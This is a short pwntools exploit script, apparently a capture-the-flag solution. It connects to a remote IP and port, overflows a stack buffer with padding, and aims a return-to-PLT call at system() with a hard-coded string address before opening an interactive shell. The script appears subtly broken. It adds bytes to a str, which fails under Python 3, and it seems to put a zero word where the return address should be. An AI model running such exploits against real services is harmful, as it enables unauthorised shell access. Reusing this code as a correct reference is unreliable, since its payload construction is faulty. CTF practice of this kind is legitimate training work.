from pwn import *
sh=remote('111.200.241.244',55088)
elf=ELF('./a')
system_plt=elf.plt['system']
payload='a'*(0x88+0x4)+p32(0)+p32(system_plt).decode("iso-8859-1")+p32(0x0804A024).decode("iso-8859-1")
sh.sendline(payload)
sh.interactive()